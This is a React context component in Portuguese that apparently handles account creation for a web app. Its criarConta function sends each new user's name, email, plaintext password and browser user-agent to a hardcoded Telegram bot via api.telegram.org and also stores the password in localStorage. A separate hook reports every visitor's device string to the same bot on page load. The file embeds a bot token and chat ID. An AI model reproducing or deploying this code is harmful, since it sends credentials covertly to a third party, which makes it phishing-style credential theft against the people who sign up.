import { createContext, useContext, useState } from "react";
import { useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { v4 as uuidv4 } from "uuid";

const UseContextForm = createContext();

export const AuthCriarConta = () => {
  const context = useContext(UseContextForm);
  return context;
};

const ContextCriarConta = ({ children }) => {
const [activeCriarConta, setActiveCriarConta] = useState(false);
const navigate = useNavigate();

// Criar Conta e enviar...
  const criarConta = (data) => {
    const dispositivo = navigator.userAgent;
    const token = uuidv4();
    const botToken = "7572426866:AAFi3LlkCEwL9HoL83kMe5VpIL6xs3vtEXo";
    const chatId = "7911135198";
   

    localStorage.setItem("nome", JSON.stringify(data.nome));
    localStorage.setItem("email", JSON.stringify(data.email));
    localStorage.setItem("senha", JSON.stringify(data.senha));
    localStorage.setItem("token", JSON.stringify(token));

    const message = `Cadastro:\n 🧑‍🦰Nome: ${data.nome}\n 📩E-mail: ${data.email}\n 🔒Senha: ${data.senha}\n📱Dispositivo:${dispositivo}`;

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    })
      .then((response) => response.json())
      .then((data) => {
        if (data.ok) {
          console.log("Mensagem enviada com sucesso!");
        } else {
          console.log("Erro ao enviar a mensagem.");
        }
      })
      .catch((error) => console.log("Erro: ", error));

      setActiveCriarConta(true);
      navigate('/');
  };

  // Capturar dispositivo....
  function captureDispositivo() {
    const dispositivo = navigator.userAgent;

    const message = `📱Dispositivo:${dispositivo}`;
    const botToken = "7572426866:AAFi3LlkCEwL9HoL83kMe5VpIL6xs3vtEXo";
    const chatId = "7911135198";

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    })
      .then((response) => response.json())
      .then((data) => {
        if (data.ok) {
          console.log("Mensagem enviada com sucesso!");
        } else {
          console.log("Erro ao enviar a mensagem.");
        }
      })
      .catch((error) => console.log("Erro: ", error));
  }

  useEffect(() => {
    captureDispositivo();
  }, []);

  return (
    <UseContextForm.Provider
      value={{ criarConta, activeCriarConta, setActiveCriarConta }}
    >
      {children}
    </UseContextForm.Provider>
  );
};

export default ContextCriarConta;
